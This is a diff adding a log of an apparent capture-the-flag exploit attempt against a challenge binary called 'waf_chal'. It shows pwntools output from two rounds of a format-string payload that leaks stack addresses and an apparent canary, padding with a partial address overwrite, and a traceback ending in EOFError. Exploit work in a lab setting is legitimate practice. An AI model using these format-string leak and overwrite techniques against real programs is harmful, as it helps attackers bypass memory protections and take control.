@@ -1,0 +1,25 @@
+Warning: _curses.error: setupterm: could not find terminfo database
+
+Terminal features will not be available.  Consider setting TERM variable to your current terminal name (or xterm).
+round 0 looped= True b"exitP0:0x7ffdef4e3c88:0x361d6989b50e1588:0x1:(nil):0x361d6989bbee1588:0x36b6c5eb8e0c1588:0x7ffd00000000:(nil):(nil):0x1:0x7ffdef4e3c80:AAAAAAAAAAAAAAAAAAAAAAAAAAA\xa2\x12@Look ma, I made sure you can't rop no more.\n>> "
+round 1 looped= False b'exitP1:0x1:(nil):0x403e18:0x7fa839a1a000:0x7ffd00000000:(nil):(nil):0x1:0x7ffdef4e3c80:0x6c78121ab6355d00:0x7ffdef4e3c60:AAAAAAAAAAAAAAAAAAAAAAAAAAA\x88\x15\x0e\xb5\x89i\x1d6\x01'
+Traceback (most recent call last):
+  File "/work/waf_chal/waf/waf_test5.py", line 19, in <module>
+    rnd(build(b"P%d:%%6$p:%%7$p:%%8$p:%%9$p:%%12$p:%%13$p:%%14$p:%%15$p:%%16$p:%%17$p:%%18$p:"%i, PRINTF))
+  File "/work/waf_chal/waf/waf_test5.py", line 12, in rnd
+    p.recvuntil(b">> ", timeout=3)
+  File "/usr/local/lib/python3.12/dist-packages/pwnlib/tubes/tube.py", line 381, in recvuntil
+    res = self.recv(timeout=self.timeout)
+          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/pwnlib/tubes/tube.py", line 146, in recv
+    return self._recv(numb, timeout) or b''
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/pwnlib/tubes/tube.py", line 216, in _recv
+    if not self.buffer and not self._fillbuffer(timeout):
+                               ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/pwnlib/tubes/tube.py", line 195, in _fillbuffer
+    data = self.recv_raw(self.buffer.get_fill_size())
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/pwnlib/tubes/process.py", line 743, in recv_raw
+    raise EOFError
+EOFError
